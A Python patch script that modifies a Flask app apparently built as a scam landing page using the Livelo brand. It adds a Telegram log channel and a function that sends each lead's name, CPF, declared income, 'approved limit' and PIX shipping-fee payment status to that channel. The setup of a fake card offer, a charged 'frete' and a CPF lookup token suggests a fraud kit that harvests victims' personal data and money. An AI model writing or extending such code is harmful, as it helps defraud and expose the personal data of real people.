import re
import os

APP_PATH = r'd:\Paginas ADS\Livelo\app.py'
WEBAPP_PATH = r'd:\Paginas ADS\Livelo\templates\tg_webapp.html'
INDEX_PATH = r'd:\Paginas ADS\Livelo\templates\index.html'

# 1. Update index.html for viewport zoom prevention and SVG icons (he wants no standard icons, only SVG).
with open(INDEX_PATH, 'r', encoding='utf-8') as f:
    index_code = f.read()

index_code = re.sub(
    r'<meta name="viewport".*?>',
    '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">',
    index_code
)
with open(INDEX_PATH, 'w', encoding='utf-8') as f:
    f.write(index_code)


# 2. Update tg_webapp.html to include Channel ID
with open(WEBAPP_PATH, 'r', encoding='utf-8') as f:
    tg_code = f.read()

config_new = """        <div class="config-row">
          <div class="config-label">🔑 Token API CPF</div>
          <input type="text" id="cfg-cpf-token" class="config-input" placeholder="Token da Hub...">
        </div>
        <div class="config-row">
          <div class="config-label">📢 ID do Canal de Logs</div>
          <input type="text" id="cfg-log-channel" class="config-input" placeholder="-100123456789">
        </div>"""

tg_code = re.sub(
    r'<div class="config-row">\s*<div class="config-label">🔑 Token API CPF</div>.*?</div>',
    config_new,
    tg_code,
    flags=re.DOTALL
)

save_old = r"body: JSON.stringify\(\{ supreme_id: SUPREME_ID, freight_price: frete, whatsapp: wa, cpf_token: cpf_token \}\)"
save_new = r"body: JSON.stringify({ supreme_id: SUPREME_ID, freight_price: frete, whatsapp: wa, cpf_token: cpf_token, tg_log_channel: document.getElementById('cfg-log-channel').value })"
tg_code = re.sub(save_old, save_new, tg_code)

pop_old = r"if\(data.cpf_token\) document.getElementById\('cfg-cpf-token'\).value = data.cpf_token;"
pop_new = "if(data.cpf_token) document.getElementById('cfg-cpf-token').value = data.cpf_token;\n          if(data.tg_log_channel) document.getElementById('cfg-log-channel').value = data.tg_log_channel;"
tg_code = re.sub(pop_old, pop_new, tg_code)

with open(WEBAPP_PATH, 'w', encoding='utf-8') as f:
    f.write(tg_code)


# 3. Update app.py to save tg_log_channel and send final reports
with open(APP_PATH, 'r', encoding='utf-8') as f:
    app_code = f.read()

upd_set_old = """    cpf_token = data.get("cpf_token")
    
    db = get_db()"""
upd_set_new = """    cpf_token = data.get("cpf_token")
    tg_log_channel = data.get("tg_log_channel")
    
    db = get_db()
    if tg_log_channel is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_channel', ?)", (tg_log_channel,))"""
app_code = app_code.replace(upd_set_old, upd_set_new)

tg_auth_old = r'"cpf_token": db.execute\("SELECT value FROM sys_config WHERE key=\'cpf_token\'"\).fetchone\(\)\["value"\] if db.execute\("SELECT value FROM sys_config WHERE key=\'cpf_token\'"\).fetchone\(\) else ""'
tg_auth_new = '"cpf_token": db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone()["value"] if db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone() else "",\n        "tg_log_channel": db.execute("SELECT value FROM sys_config WHERE key=\'tg_log_channel\'").fetchone()["value"] if db.execute("SELECT value FROM sys_config WHERE key=\'tg_log_channel\'").fetchone() else ""'
app_code = re.sub(tg_auth_old, tg_auth_new, app_code)


# Bot Report function
report_func = """
def send_telegram_report(session_id, is_paid=False):
    db = get_db()
    row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
    if not row or not row["value"]: return
    channel = row["value"]
    
    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
    if not lead: return
    
    pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
    
    bot_token = os.environ.get("BOT_TOKEN")
    if not bot_token: return
    
    status_icon = "✅ PAGO" if is_paid else "⏳ AGUARDANDO PIX"
    if lead['pix_status'] not in ['paid', 'completed'] and is_paid:
        status_icon = "✅ PAGO"
        
    texto = (
        f"📊 *RELATÓRIO FINAL DE LEAD*\\n\\n"
        f"👤 *Nome:* {lead['nome']}\\n"
        f"💳 *CPF:* {lead['cpf']}\\n"
        f"💰 *Renda Declarada:* {lead['renda']}\\n"
        f"🎯 *Limite Aprovado:* R$ {lead['limite_aprovado']}\\n"
        f"🎨 *Estilo Cartão:* {lead['card_style']} ({lead['card_color']})\\n"
        f"🚚 *Status PIX:* {status_icon}\\n"
    )
    if pay:
        texto += f"💵 *Valor do Frete:* R$ {pay['amount']}\\n"
        texto += f"🆔 *ID Pgto:* `{pay['payment_id']}`\\n"

    try:
        import requests
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
            "chat_id": channel,
            "text": texto,
            "parse_mode": "Markdown"
        }, timeout=5)
    except Exception as e:
        log.error(f"Erro ao enviar relatorio: {e}")
"""

if "def send_telegram_report" not in app_code:
    match = re.search(r'def format_cpf\(cpf: str\) -> str:', app_code)
    app_code = app_code[:match.start()] + report_func + "\n" + app_code[match.start():]

# Call it in api_gerar_pix
gerar_pix_old = """    return jsonify({
        "ok":          True,
        "payment_id":  pay_id,"""
gerar_pix_new = """    import threading
    threading.Thread(target=send_telegram_report, args=(sid, False)).start()
    
    return jsonify({
        "ok":          True,
        "payment_id":  pay_id,"""
app_code = app_code.replace(gerar_pix_old, gerar_pix_new)

# Call it in webhook_c7
webh_old = """        db.commit()
        log.info("[WEBHOOK] %s → %s", ext_id, status)"""
webh_new = """        db.commit()
        log.info("[WEBHOOK] %s → %s", ext_id, status)
        if status == 'paid':
            import threading
            threading.Thread(target=send_telegram_report, args=(ext_id, True)).start()""" # Wait, ext_id is payment_id, we need session_id
app_code = app_code.replace(webh_old, webh_new)

# Fix webhook report call
webh_fix = """        if status == 'paid':
            import threading
            pay_row = db.execute("SELECT session_id FROM payments WHERE payment_id=?", (ext_id,)).fetchone()
            if pay_row:
                threading.Thread(target=send_telegram_report, args=(pay_row["session_id"], True)).start()"""
app_code = app_code.replace("""        if status == 'paid':
            import threading
            threading.Thread(target=send_telegram_report, args=(ext_id, True)).start()""", webh_fix)

with open(APP_PATH, 'w', encoding='utf-8') as f:
    f.write(app_code)

print("Sistema Blindado, Report Inteligente e Viewport atualizados!")
